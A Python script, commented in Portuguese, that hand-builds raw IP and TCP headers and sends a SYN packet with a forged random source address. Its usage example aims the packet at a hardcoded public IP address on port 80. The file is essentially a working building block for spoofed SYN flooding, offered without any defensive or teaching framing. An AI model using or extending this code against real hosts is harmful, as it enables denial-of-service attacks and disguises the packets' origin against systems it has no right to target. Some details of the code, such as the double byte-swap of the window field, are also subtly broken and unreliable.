import socket
from struct import pack
import random

# Função para calcular o checksum
def checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        if i+1 < len(data):
            w = (data[i] << 8) + (data[i+1])
        else:
            w = (data[i] << 8) + 0
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

# Função para enviar pacote SYN com IP de origem falsificado
def enviar_pacote_syn(ip_destino, porta_destino):
    try:
        # Criar o socket RAW
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        
        # IP de origem falsificado
        ip_origem_falsificado = f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"
        
        # Cabeçalho IP
        def gerar_cabecalho_ip():
            ip_ihl = 5
            ip_versao = 4
            ip_tos = 0
            ip_tot_len = 20 + 20  # IP + TCP headers
            ip_id = random.randint(0, 65535)
            ip_frag_off = 0
            ip_ttl = 64
            ip_proto = socket.IPPROTO_TCP
            ip_checksum = 0
            ip_saddr = socket.inet_aton(ip_origem_falsificado)
            ip_daddr = socket.inet_aton(ip_destino)

            ip_ihl_ver = (ip_versao << 4) + ip_ihl
            cabecalho_ip_sem_checksum = pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                                             ip_ttl, ip_proto, ip_checksum, ip_saddr, ip_daddr)
            # Calcular checksum do cabeçalho IP
            ip_checksum = checksum(cabecalho_ip_sem_checksum)
            return pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                        ip_ttl, ip_proto, ip_checksum, ip_saddr, ip_daddr)

        # Cabeçalho TCP com a flag SYN ativada
        def gerar_cabecalho_tcp():
            porta_origem = random.randint(1024, 65535)
            numero_sequencia = random.randint(0, 4294967295)
            numero_ack = 0
            offset_reservado = (5 << 4) | 0
            flags = 0x02  # Flag SYN
            janela = socket.htons(5840)
            checksum_tcp = 0
            ponteiro_urgente = 0

            cabecalho_tcp_sem_checksum = pack('!HHLLBBHHH', porta_origem, porta_destino, numero_sequencia, numero_ack,
                                              offset_reservado, flags, janela, checksum_tcp, ponteiro_urgente)
            
            # Pseudo-cabeçalho para cálculo do checksum TCP
            pseudo_cabecalho = pack('!4s4sBBH', socket.inet_aton(ip_origem_falsificado),
                                    socket.inet_aton(ip_destino), 0, socket.IPPROTO_TCP, len(cabecalho_tcp_sem_checksum))
            checksum_tcp = checksum(pseudo_cabecalho + cabecalho_tcp_sem_checksum)

            # Cabeçalho TCP com checksum
            return pack('!HHLLBBHHH', porta_origem, porta_destino, numero_sequencia, numero_ack,
                        offset_reservado, flags, janela, checksum_tcp, ponteiro_urgente)

        # Gerar cabeçalhos IP e TCP
        cabecalho_ip = gerar_cabecalho_ip()
        cabecalho_tcp = gerar_cabecalho_tcp()

        # Montar o pacote completo
        pacote = cabecalho_ip + cabecalho_tcp

        # Enviar pacote SYN
        sock.sendto(pacote, (ip_destino, 0))
        print(f"SYN com IP falso {ip_origem_falsificado} enviado para {ip_destino}:{porta_destino}")

    except socket.error as e:
        print(f"Erro ao enviar SYN para {ip_destino}: {e}")

    finally:
        sock.close()

# Exemplo de uso
ip_destino = "185.107.192.36"
porta_destino = 80  # Porta alvo
enviar_pacote_syn(ip_destino, porta_destino)
